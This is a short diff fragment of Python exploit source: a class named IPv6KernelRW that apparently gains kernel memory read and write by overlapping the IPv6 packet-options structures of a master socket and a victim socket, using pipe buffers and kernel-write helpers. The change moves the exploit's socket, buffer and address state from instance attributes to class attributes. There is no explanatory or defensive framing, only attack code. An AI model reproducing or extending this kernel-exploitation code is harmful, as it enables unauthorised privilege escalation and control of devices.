@@ -2537,11 +2537,11 @@ class IPv6KernelRW(object):
         read_fd = struct.unpack("<I", pipe_fds[0:4])[0]
         write_fd = struct.unpack("<I", pipe_fds[4:8])[0]
 
-        self.pipe_read_fd = read_fd
-        self.pipe_write_fd = write_fd
-        self.pipe_addr = self.get_fd_data_addr(read_fd)
-        self.pipemap_buffer = alloc(0x14)
-        self.read_mem = alloc(PAGE_SIZE)
+        IPv6KernelRW.pipe_read_fd = read_fd
+        IPv6KernelRW.pipe_write_fd = write_fd
+        IPv6KernelRW.pipe_addr = self.get_fd_data_addr(read_fd)
+        IPv6KernelRW.pipemap_buffer = alloc(0x14)
+        IPv6KernelRW.read_mem = alloc(PAGE_SIZE)
 
     # overlap the pktopts of two IPV6 sockets
     def create_overlapped_ipv6_sockets(self):
@@ -2584,11 +2584,11 @@ class IPv6KernelRW(object):
         # magic
         self.kwrite8(master_pktopts + 0x10, slave_pktopts + 0x10)
 
-        self.master_target_buf = master_target_buf
-        self.slave_buf = slave_buf
-        self.pktinfo_size_store = pktinfo_size_store
-        self.master_sock = master_sock
-        self.victim_sock = victim_sock
+        IPv6KernelRW.master_target_buf = master_target_buf
+        IPv6KernelRW.slave_buf = slave_buf
+        IPv6KernelRW.pktinfo_size_store = pktinfo_size_store
+        IPv6KernelRW.master_sock = master_sock
+        IPv6KernelRW.victim_sock = victim_sock
 
     def ipv6_write_to_victim(self, kaddr):
         self.master_target_buf[0:8] = struct.pack("<Q", kaddr)
